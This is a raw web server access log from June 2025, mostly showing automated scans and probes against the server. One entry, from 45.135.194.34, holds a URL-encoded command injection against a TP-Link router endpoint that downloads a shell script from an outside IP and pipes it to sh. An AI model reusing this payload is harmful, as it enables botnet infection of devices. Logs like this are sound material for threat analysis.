45.55.46.233 - - [22/Jun/2025:04:58:52 +0000] "GET /t4 HTTP/1.1" 500 6864 "-" "Mozilla/5.0"
45.55.46.233 - - [22/Jun/2025:04:58:53 +0000] "GET /geoip/ HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
199.204.97.58 - - [22/Jun/2025:05:00:19 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:05:04:13 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:05:13:49 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
89.42.231.140 - - [22/Jun/2025:05:17:33 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [22/Jun/2025:05:22:06 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [22/Jun/2025:05:26:26 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:05:27:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
93.174.93.12 - - [22/Jun/2025:05:34:53 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
185.194.204.246 - - [22/Jun/2025:05:40:06 +0000] "\x16\x03\x01\x01\x9A\x01\x00\x01\x96\x03\x03\x00i~]\x9C\x22$\xBC\xA9\x8D\x7F\xC2\xD5q\xB0\xE2\xB3mQO\xE4\xC0Y\x0B\x1A;c\x93\x84\x5CZG \xA0\x15\xD0ty\xF4\xE6B \xA6\xCB\x82gE\x00\x16\x85\xB2\x8E\xDA\x0E\x00\xBD\xC2\x02\x9F\x14-\xF4X\xD3\x9D\x00\xC2\x13\x01\x13\x02\x13\x03\x13\x04\x13\x05\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0S\x00\xA7\xC0+\xC0/\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0R\x00\xA6\xC0$\xC0(\x00k\xC0s\xC0w\x00\xC4\x00m\x00\xC5\xC0#\xC0'\x00g\xC0r\xC0v\x00\xBE\x00l\x00\xBF\xC0" 400 157 "-" "-"
199.204.97.58 - - [22/Jun/2025:05:40:49 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
141.255.162.250 - - [22/Jun/2025:05:41:31 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.135.194.34 - - [22/Jun/2025:05:45:02 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%24%28killall%20-9%20mipsel%20mpsl%3B%28wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox%20wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%29%20%7C%20sh%20-s%20tplink%3B%29 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
204.76.203.219 - - [22/Jun/2025:05:49:13 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:05:54:19 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
34.79.92.92 - - [22/Jun/2025:05:55:33 +0000] "GET / HTTP/1.1" 500 6864 "-" "python-requests/2.32.4"
199.204.97.58 - - [22/Jun/2025:06:07:56 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
149.50.103.48 - - [22/Jun/2025:06:18:08 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [22/Jun/2025:06:20:27 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:06:21:19 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
5.183.209.244 - - [22/Jun/2025:06:28:26 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:06:35:21 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [22/Jun/2025:06:48:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:06:48:46 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:07:01:49 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
196.251.70.87 - - [22/Jun/2025:07:02:24 +0000] "GET /.git/refs/heads/ HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
80.82.77.202 - - [22/Jun/2025:07:10:28 +0000] "GET / HTTP/1.0" 500 6851 "-" "Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1"
199.204.97.58 - - [22/Jun/2025:07:15:19 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:07:17:34 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
149.50.103.48 - - [22/Jun/2025:07:26:36 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
